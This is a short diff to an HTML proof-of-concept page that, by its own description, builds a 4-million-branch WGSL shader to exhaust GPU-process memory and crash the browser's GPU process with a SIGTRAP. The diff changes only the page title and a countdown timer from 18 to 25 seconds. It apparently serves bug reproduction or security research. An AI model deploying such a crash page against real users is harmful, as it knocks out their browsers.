@@ -5,7 +5,7 @@
     <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
 </head>
 <body>
-    <h2>Tint AST Memory Exhaustion (SIGTRAP)</h2>
+    <h2>Tint AST Memory Exhaustion (SIGTRAP)25</h2>
     <p>Clicking the button builds a 4-million branch WGSL shader to OOM the GPU process.</p>
     <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
     <div id="status" style="margin-top: 20px; white-space: pre-wrap;">Waiting...</div>
@@ -44,7 +44,7 @@
                     device.createShaderModule({ code: killerWGSL });
                     
                     // 3. The 18-Second Memory Pressure Countdown
-                    let timeLeft = 18;
+                    let timeLeft = 25;
                     statusEl.innerText += `3. GPU memory filling up. Auto-refreshing in ${timeLeft}s to trigger teardown SIGTRAP...`;
                     
                     const timer = setInterval(() => {
